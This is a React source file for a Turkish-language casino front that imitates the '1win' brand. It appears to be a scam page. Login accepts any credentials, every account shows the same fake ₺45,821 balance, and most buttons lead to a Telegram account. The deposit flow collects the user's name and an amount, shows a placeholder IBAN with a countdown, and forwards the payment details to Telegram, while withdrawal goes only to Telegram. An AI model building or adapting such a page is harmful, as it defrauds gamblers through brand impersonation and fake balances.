import { useState, useEffect, useRef } from 'react';
import './App.css';

const TELEGRAM_LINK = 'https://t.me/ONESUPPORT_TR';

function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [showLoginModal, setShowLoginModal] = useState(true);
  const [showRegisterModal, setShowRegisterModal] = useState(false);
  const [showDepositModal, setShowDepositModal] = useState(false);
  const [showSocialModal, setShowSocialModal] = useState(false);
  const [showProfileModal, setShowProfileModal] = useState(false);
  const [showBalanceToast, setShowBalanceToast] = useState(false);
  const [depositStep, setDepositStep] = useState(1);
  const [loginMethod, setLoginMethod] = useState('phone');
  const [registerMethod, setRegisterMethod] = useState('phone');
  const [countdown, setCountdown] = useState(600);
  const countdownRef = useRef(null);

  // Form states
  const [loginPhone, setLoginPhone] = useState('');
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [registerPhone, setRegisterPhone] = useState('');
  const [registerEmail, setRegisterEmail] = useState('');
  const [registerPassword, setRegisterPassword] = useState('');
  const [registerCurrency, setRegisterCurrency] = useState('TRY');

  // Deposit form
  const [depFirstName, setDepFirstName] = useState('');
  const [depLastName, setDepLastName] = useState('');
  const [depAmount, setDepAmount] = useState('');

  // Balance toast auto-dismiss
  useEffect(() => {
    if (showBalanceToast) {
      const timer = setTimeout(() => setShowBalanceToast(false), 10000);
      return () => clearTimeout(timer);
    }
  }, [showBalanceToast]);

  // Countdown timer for deposit step 2
  useEffect(() => {
    if (depositStep === 2 && showDepositModal) {
      setCountdown(600);
      countdownRef.current = setInterval(() => {
        setCountdown(prev => {
          if (prev <= 0) { clearInterval(countdownRef.current); return 0; }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(countdownRef.current);
    }
  }, [depositStep, showDepositModal]);

  useEffect(() => {
    const savedUser = localStorage.getItem('username');
    if (savedUser) { setUsername(savedUser); setIsLoggedIn(true); }
  }, []);

  const handleLogin = (e) => {
    e.preventDefault();
    const user = loginMethod === 'phone' ? loginPhone : loginEmail;
    if (user && loginPassword) {
      setUsername(user); setIsLoggedIn(true);
      localStorage.setItem('username', user);
      setShowLoginModal(false);
      setLoginPhone(''); setLoginEmail(''); setLoginPassword('');
    }
  };

  const handleRegister = (e) => {
    e.preventDefault();
    const user = registerMethod === 'phone' ? registerPhone : registerEmail;
    if (user && registerPassword) {
      setUsername(user); setIsLoggedIn(true);
      localStorage.setItem('username', user);
      setShowRegisterModal(false);
      setRegisterPhone(''); setRegisterEmail(''); setRegisterPassword('');
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false); setUsername('');
    localStorage.removeItem('username');
  };

  const openTelegram = () => window.open(TELEGRAM_LINK, '_blank');

  const handleBalanceClick = () => setShowBalanceToast(true);

  const openDeposit = () => {
    setDepositStep(1);
    setDepFirstName(''); setDepLastName(''); setDepAmount('');
    setShowDepositModal(true);
  };

  const handleDepositNext = () => {
    if (depFirstName && depLastName && depAmount) {
      setDepositStep(2);
    }
  };

  const handleTransferConfirm = () => {
    const msg = `Ödeme Bilgileri:%0AAdı: ${depFirstName}%0ASoyadı: ${depLastName}%0ATutar: ₺${depAmount}`;
    window.open(`https://t.me/ONESUPPORT_TR?text=${msg}`, '_blank');
    setShowDepositModal(false);
  };

  const closeDeposit = () => {
    setShowDepositModal(false);
    clearInterval(countdownRef.current);
  };

  const formatCountdown = (s) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${String(m).padStart(2,'0')}dk : ${String(sec).padStart(2,'0')}sn`;
  };

  const setQuickAmount = (val) => setDepAmount(val);

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
  };

  const games = [
    { name: 'LUCKY JET', color: 'from-purple-600 to-purple-800' },
    { name: 'ROCKET QUEEN', color: 'from-pink-500 to-pink-700' },
    { name: 'MINES', color: 'from-blue-500 to-blue-700' },
    { name: 'BLACKJACK', color: 'from-blue-600 to-blue-900' },
    { name: 'CRASH', color: 'from-green-600 to-green-800' },
    { name: 'COINFLIP', color: 'from-yellow-500 to-orange-600' },
  ];

  const socialMediaItems = [
    { name: 'Telegram', icon: '✈️' },
    { name: 'WhatsApp', icon: '💬' },
    { name: 'Instagram', icon: '📷' },
    { name: 'Facebook', icon: '📘' },
    { name: 'X (Twitter)', icon: '🐦' },
    { name: 'Pinterest', icon: '📌' },
    { name: 'Threads', icon: '🧵' },
  ];

  return (
    <div className="app-container">
      {/* Balance Toast */}
      {showBalanceToast && (
        <div className="toast-overlay" onClick={() => setShowBalanceToast(false)}>
          <div className="toast-notification" onClick={(e) => e.stopPropagation()}>
            <div className="toast-icon">
              <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="toast-text">
              <p className="toast-title">Bakiye Yükleme</p>
              <p className="toast-desc">Bakiye yüklemek için Telegram'dan yazınız</p>
            </div>
            <button onClick={() => setShowBalanceToast(false)} className="toast-close">✕</button>
          </div>
        </div>
      )}

      {/* Left Sidebar */}
      <div className="sidebar">
        <button onClick={() => isLoggedIn ? setShowProfileModal(true) : setShowLoginModal(true)} className="profile-icon" data-testid="profile-icon">
          <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
            <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
          </svg>
        </button>

        <div className="free-money-card" onClick={openTelegram}>
          <div className="free-money-emoji">💸</div>
          <div className="free-money-text">
            <span>Free</span>
            <span>money</span>
          </div>
        </div>

        <div className="sidebar-icons-list">
          <button className="sb-btn arrow-btn" onClick={openTelegram}><span>&raquo;</span></button>
          <button className="sb-btn" onClick={openTelegram}>♠</button>
          <button className="sb-btn" onClick={openTelegram}>⚽</button>
          <button className="sb-btn" onClick={() => { if(isLoggedIn) openDeposit(); else setShowLoginModal(true); }}>💲</button>
          <button className="sb-btn has-badge" onClick={openTelegram}>🎁<span className="badge">1</span></button>
          <button className="sb-btn" onClick={openTelegram}>👑</button>
          <button className="sb-btn" onClick={openTelegram}>%</button>
          <div className="sb-divider"></div>
          <button className="sb-btn" onClick={openTelegram}>Ф</button>
          <button className="sb-btn windows" onClick={openTelegram}>⊞</button>
          <div className="sb-mini-group">
            <button className="sb-mini" onClick={openTelegram}>✈</button>
            <button className="sb-mini" onClick={openTelegram}>💬</button>
            <button className="sb-mini" onClick={openTelegram}>⊙</button>
            <button className="sb-mini" onClick={openTelegram}>⋮</button>
          </div>
          <button className="sb-btn flag" onClick={openTelegram}>🇹🇷</button>
          <div className="sb-divider"></div>
          <button className="sb-btn chat-bubble" onClick={() => setShowSocialModal(true)}>
            <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z" clipRule="evenodd" />
            </svg>
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="main-content">
        {/* Header */}
        <header className="header">
          <div className="header-left">
            <img
              src="https://customer-assets.emergentagent.com/job_wait-image-coming/artifacts/zvtfamu3_g%C3%B6rsel_2026-04-13_235130355.png"
              alt="1win"
              className="logo-image"
            />
            <div className="nav-icons">
              <button className="nav-icon active" data-testid="nav-home">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z" />
                </svg>
              </button>
              <button className="nav-icon">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clipRule="evenodd" />
                </svg>
              </button>
              <button className="nav-icon">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                </svg>
              </button>
              <button className="nav-icon">⚽</button>
            </div>
          </div>

          <div className="header-right">
            {isLoggedIn ? (
              <>
                <button onClick={handleBalanceClick} className="balance-btn" data-testid="balance-btn">
                  <span className="bal-code">TRY ∨</span>
                  <span className="bal-amount">45.821</span>
                </button>
                <button onClick={openDeposit} className="deposit-btn" data-testid="deposit-btn">Para yatır</button>
                <button onClick={openTelegram} className="notif-btn" data-testid="notif-btn">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z" />
                  </svg>
                </button>
              </>
            ) : (
              <>
                <button onClick={() => setShowLoginModal(true)} className="auth-btn" data-testid="login-btn">Giriş</button>
                <button onClick={() => setShowRegisterModal(true)} className="auth-btn register" data-testid="register-btn">Kayıt</button>
              </>
            )}
          </div>
        </header>

        {/* Content Area */}
        <div className="content-area">
          <div className="hero-banner">
            <div className="hero-content">
              <h2 className="hero-title">VIP club:</h2>
              <p className="hero-subtitle">özel ayrıcalıklar</p>
              <p className="hero-subtitle">ve kişiye özel hizmet</p>
            </div>
          </div>

          <div className="promo-section">
            <div className="promo-card-large">
              <div className="promo-content">
                <h3 className="promo-title">1 BTC ve</h3>
                <h3 className="promo-title">ücretsiz döndürme</h3>
                <h3 className="promo-title">çekilişi</h3>
                <h3 className="promo-title">Easter BTC'de</h3>
                <button className="promo-btn">Daha fazla bilgi</button>
              </div>
            </div>
            <div className="promo-cards-right">
              <div className="promo-card-small green">
                <h4>Free money</h4>
                <p className="text-xs mt-1">URUS SE ve başka</p>
                <p className="text-xs">ödüller çekilişi</p>
              </div>
              <div className="promo-card-small blue">
                <h4>Bonuslar</h4>
                <p className="text-xs mt-1">4 mevcut bonus</p>
              </div>
            </div>
          </div>

          <div className="games-section">
            <div className="games-header">
              <div className="flex items-center gap-2">
                <span className="text-white text-sm font-bold">1W</span>
                <h3 className="games-title">1win games</h3>
              </div>
              <div className="games-nav">
                <button className="games-nav-text">Tüm oyunlar</button>
                <button className="games-arrow-btn">‹</button>
                <button className="games-arrow-btn">›</button>
              </div>
            </div>
            <div className="games-grid">
              {games.map((game, idx) => (
                <div key={idx} className="game-card">
                  <div className={`game-card-bg bg-gradient-to-br ${game.color}`}>
                    <span className="game-card-title">{game.name}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* === MODALS === */}

      {/* Login Modal */}
      {showLoginModal && (
        <div className="modal-overlay" onClick={() => setShowLoginModal(false)}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Giriş</h2>
              <button onClick={() => setShowLoginModal(false)} className="modal-x">✕</button>
            </div>
            <div className="modal-tabs">
              <button className={`mtab ${loginMethod === 'phone' ? 'active' : ''}`} onClick={() => setLoginMethod('phone')}>📞 Telefon</button>
              <button className={`mtab ${loginMethod === 'email' ? 'active' : ''}`} onClick={() => setLoginMethod('email')}>✉ E-posta</button>
            </div>
            <form onSubmit={handleLogin} className="modal-body">
              {loginMethod === 'phone' ? (
                <div className="input-group">
                  <span className="input-pre">🇹🇷 +90</span>
                  <input type="tel" placeholder="+90" value={loginPhone} onChange={(e) => setLoginPhone(e.target.value)} required data-testid="login-phone-input" />
                </div>
              ) : (
                <div className="input-group">
                  <span className="input-pre">✉</span>
                  <input type="email" placeholder="E-posta" value={loginEmail} onChange={(e) => setLoginEmail(e.target.value)} required data-testid="login-email-input" />
                </div>
              )}
              <div className="input-group">
                <span className="input-pre">🔒</span>
                <input type="password" placeholder="Şifre" value={loginPassword} onChange={(e) => setLoginPassword(e.target.value)} required data-testid="login-password-input" />
              </div>
              <a href="#" className="forgot-link">Şifrenizi mi unuttunuz?</a>
              <button type="submit" className="green-btn" data-testid="login-submit-btn">Giriş yap</button>
              <div className="or-divider">veya</div>
            </form>
            <div className="modal-footer">
              <p>Hesabınız yok mu?</p>
              <button onClick={() => { setShowLoginModal(false); setShowRegisterModal(true); }} className="link-action">Kaydol</button>
            </div>
          </div>
        </div>
      )}

      {/* Register Modal */}
      {showRegisterModal && (
        <div className="modal-overlay" onClick={() => setShowRegisterModal(false)}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Kayıt</h2>
              <button onClick={() => setShowRegisterModal(false)} className="modal-x">✕</button>
            </div>
            <form onSubmit={handleRegister} className="modal-body">
              <select value={registerCurrency} onChange={(e) => setRegisterCurrency(e.target.value)} className="currency-select" data-testid="register-currency-select">
                <option value="TRY">TRY Türk Lirası</option>
                <option value="USD">USD Amerikan Doları</option>
                <option value="EUR">EUR Euro</option>
              </select>
              <div className="modal-tabs">
                <button type="button" className={`mtab ${registerMethod === 'phone' ? 'active' : ''}`} onClick={() => setRegisterMethod('phone')}>📞 Telefon</button>
                <button type="button" className={`mtab ${registerMethod === 'email' ? 'active' : ''}`} onClick={() => setRegisterMethod('email')}>✉ E-posta</button>
              </div>
              {registerMethod === 'phone' ? (
                <div className="input-group">
                  <span className="input-pre">🇹🇷 +90</span>
                  <input type="tel" placeholder="+90 000 000 00 00" value={registerPhone} onChange={(e) => setRegisterPhone(e.target.value)} required data-testid="register-phone-input" />
                </div>
              ) : (
                <div className="input-group">
                  <span className="input-pre">✉</span>
                  <input type="email" placeholder="E-posta" value={registerEmail} onChange={(e) => setRegisterEmail(e.target.value)} required data-testid="register-email-input" />
                </div>
              )}
              <div className="input-group">
                <span className="input-pre">🔒</span>
                <input type="password" placeholder="Şifre" value={registerPassword} onChange={(e) => setRegisterPassword(e.target.value)} required minLength={8} data-testid="register-password-input" />
              </div>
              <p className="hint-text">En az 8 karakter</p>
              <a href="#" className="promo-code-link">Promosyon kodu ekleyin</a>
              <label className="check-row">
                <input type="checkbox" required />
                <span>"Kaydol"a tıklayarak <a href="#" className="terms-link">kullanıcı sözleşmesini</a> kabul ediyorum</span>
              </label>
              <button type="submit" className="green-btn" data-testid="register-submit-btn">Kaydol</button>
              <div className="or-divider">veya</div>
            </form>
            <div className="modal-footer">
              <p>Hesabınız var mı?</p>
              <button onClick={() => { setShowRegisterModal(false); setShowLoginModal(true); }} className="link-action">Giriş yap</button>
            </div>
          </div>
        </div>
      )}

      {/* Deposit Modal */}
      {showDepositModal && (
        <div className="modal-overlay" onClick={closeDeposit}>
          <div className="deposit-panel" onClick={(e) => e.stopPropagation()}>
            {/* Header */}
            <div className="dep-header">
              {depositStep === 2 && (
                <button onClick={() => setDepositStep(1)} className="dep-back">‹ Geri</button>
              )}
              {depositStep === 1 && <div></div>}
              <button onClick={closeDeposit} className="dep-close">✕</button>
            </div>

            {/* Bank header */}
            <div className="dep-bank-header">
              <div className="bank-logo">
                <svg className="w-8 h-8" fill="#1a3a5c" viewBox="0 0 24 24">
                  <path d="M3 21h18v-2H3v2zm0-4h18v-1H3v1zm1-3h4V8H4v6zm6 0h4V8h-4v6zm6 0h4V8h-4v6zM2 7l10-5 10 5v1H2V7z"/>
                </svg>
                <div className="bank-logo-text">
                  <span className="blt-top">Banka</span>
                  <span className="blt-bottom">Havalesi</span>
                </div>
              </div>
              <h3 className="dep-bank-title">Banka Havalesi</h3>
            </div>

            {/* Fiat / Kripto tabs */}
            <div className="dep-type-tabs">
              <button className="dep-type-tab active">
                <span className="dtt-icon green">$</span> Fiat
              </button>
              <button className="dep-type-tab">
                <span className="dtt-icon orange">B</span> Kripto
              </button>
            </div>

            {depositStep === 1 ? (
              /* Step 1: Name + Amount form */
              <div className="dep-form">
                <input
                  type="text"
                  placeholder="Adı"
                  value={depFirstName}
                  onChange={(e) => setDepFirstName(e.target.value)}
                  className="dep-input"
                  data-testid="dep-firstname"
                  required
                />
                <input
                  type="text"
                  placeholder="Soyadı"
                  value={depLastName}
                  onChange={(e) => setDepLastName(e.target.value)}
                  className="dep-input"
                  data-testid="dep-lastname"
                  required
                />
                <div className="dep-amount-box">
                  <div className="dep-amount-label">Tutar</div>
                  <div className="dep-amount-row">
                    <span className="dep-currency">₺</span>
                    <input
                      type="text"
                      value={depAmount}
                      onChange={(e) => setDepAmount(e.target.value)}
                      className="dep-amount-input"
                      placeholder="100.000"
                      data-testid="dep-amount"
                    />
                    <span className="dep-bonus-badge">Bonus: 70 FS</span>
                  </div>
                  <p className="dep-range">₺100 ile ₺100.000 arasında</p>
                </div>

                <div className="dep-quick-amounts">
                  <button onClick={() => setQuickAmount('300')} className="quick-amt">₺300</button>
                  <button onClick={() => setQuickAmount('1.000')} className="quick-amt">₺1.000</button>
                  <button onClick={() => setQuickAmount('5.000')} className="quick-amt">₺5.000</button>
                  <button onClick={() => setQuickAmount('10.000')} className="quick-amt">₺10.000</button>
                </div>

                <button onClick={handleDepositNext} className="green-btn full" data-testid="dep-submit-btn">
                  Para yatır
                </button>

                <div className="dep-instructions-toggle">
                  <span>ℹ️ Ayrıntılı talimatlar</span>
                </div>

                <div className="dep-bonus-section">
                  <div className="dep-bonus-header">
                    <h4>Yatırım bonusu</h4>
                    <span className="dep-bonussuz">Bonussuz</span>
                  </div>
                  <div className="dep-bonus-card">
                    <div className="dep-bonus-card-text">
                      <p className="dep-bonus-main">70 ücretsiz döndürme</p>
                      <p className="dep-bonus-sub">300TL tutarında para yükleyin ve bonus alın</p>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              /* Step 2: Bank info + confirm */
              <div className="dep-confirm">
                <p className="dep-warning">Tam tutarı kopyalayın, aksi takdirde transfer hesabınıza geçmez</p>

                <div className="dep-bank-info-card">
                  <h4 className="dep-bank-info-title">Banka bilgilerini kopyala</h4>

                  <div className="dep-info-row">
                    <div className="dep-info-icon gray">
                      <svg className="w-5 h-5" fill="white" viewBox="0 0 20 20">
                        <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zM18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"/>
                      </svg>
                    </div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Alıcının kart numarası</span>
                      <span className="dep-info-value">TR000000000000000000000000</span>
                    </div>
                    <button onClick={() => copyToClipboard('TR000000000000000000000000')} className="dep-copy-btn" data-testid="copy-iban">
                      <svg className="w-5 h-5" fill="#999" viewBox="0 0 20 20">
                        <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z"/>
                        <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z"/>
                      </svg>
                    </button>
                  </div>

                  <div className="dep-info-row">
                    <div className="dep-info-icon dark">
                      <svg className="w-5 h-5" fill="white" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Alıcı</span>
                      <span className="dep-info-value">ALICI ADI</span>
                    </div>
                  </div>

                  <div className="dep-info-row">
                    <div className="dep-info-icon red">₺</div>
                    <div className="dep-info-text">
                      <span className="dep-info-label">Tutar</span>
                      <span className="dep-info-value">₺{depAmount || '0'}</span>
                    </div>
                    <button onClick={() => copyToClipboard(depAmount)} className="dep-copy-btn" data-testid="copy-amount">
                      <svg className="w-5 h-5" fill="#999" viewBox="0 0 20 20">
                        <path d="M8 3a1 1 0 011-1h2a1 1 0 110 2H9a1 1 0 01-1-1z"/>
                        <path d="M6 3a2 2 0 00-2 2v11a2 2 0 002 2h8a2 2 0 002-2V5a2 2 0 00-2-2 3 3 0 01-3 3H9a3 3 0 01-3-3z"/>
                      </svg>
                    </button>
                  </div>
                </div>

                <div className="dep-countdown">
                  <span className="dep-countdown-icon">⏳</span>
                  <span>Transferi bekliyoruz:</span>
                  <span className="dep-countdown-time">{formatCountdown(countdown)}</span>
                </div>

                <button onClick={handleTransferConfirm} className="green-btn full" data-testid="transfer-confirm-btn">
                  Transferi onayla
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Social Modal */}
      {showSocialModal && (
        <div className="modal-overlay" onClick={() => setShowSocialModal(false)}>
          <div className="modal-box" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">
              <h2>Sosyal Medya</h2>
              <button onClick={() => setShowSocialModal(false)} className="modal-x">✕</button>
            </div>
            <div className="social-list">
              {socialMediaItems.map((item, idx) => (
                <button key={idx} onClick={openTelegram} className="social-item" data-testid={`social-${item.name.toLowerCase()}`}>
                  <span className="social-icon">{item.icon}</span>
                  <span className="social-name">{item.name}</span>
                  <span className="social-arrow">›</span>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Profile Modal */}
      {showProfileModal && isLoggedIn && (
        <div className="modal-overlay" onClick={() => setShowProfileModal(false)}>
          <div className="profile-panel" onClick={(e) => e.stopPropagation()}>
            <div className="profile-top">
              <h2>Profil</h2>
              <button onClick={() => setShowProfileModal(false)} className="profile-close">✕</button>
            </div>

            <div className="profile-user-section">
              <h3 className="profile-username">{username}</h3>
              <p className="profile-id">ID 1923196</p>
            </div>

            <div className="profile-balance-card">
              <span className="pbc-label">Hesap</span>
              <span className="pbc-amount">₺45.821</span>
              <div className="pbc-buttons">
                <button onClick={() => { setShowProfileModal(false); openDeposit(); }} className="pbc-deposit" data-testid="profile-deposit-btn">
                  <span className="pbc-plus">+</span> Para yatır
                </button>
                <button onClick={openTelegram} className="pbc-withdraw" data-testid="profile-withdraw-btn">
                  Para çek
                </button>
              </div>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🎁</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonuslar</span>
                  <span className="pmi-desc">Ücretsiz döndürmeler ve diğer teklifler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🏷️</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonus code'ları</span>
                  <span className="pmi-desc">Kod etkinleştirme</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🕐</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bahis geçmişi</span>
                  <span className="pmi-desc">Açık ve sonuçlanmış bahisler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">💳</span>
                <div className="pmi-text">
                  <span className="pmi-title">Ödeme geçmişi</span>
                  <span className="pmi-desc">Para yatırma ve çekme durumları</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">⚙️</span>
                <div className="pmi-text">
                  <span className="pmi-title">Ayarlar</span>
                  <span className="pmi-desc">Kişisel verileri düzenle</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">🔄</span>
                <div className="pmi-text">
                  <span className="pmi-title">7/24 destek</span>
                  <span className="pmi-desc">Tüm iletişim bilgileri</span>
                </div>
              </button>
            </div>

            <button onClick={handleLogout} className="profile-logout" data-testid="logout-btn">Çıkış Yap</button>
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
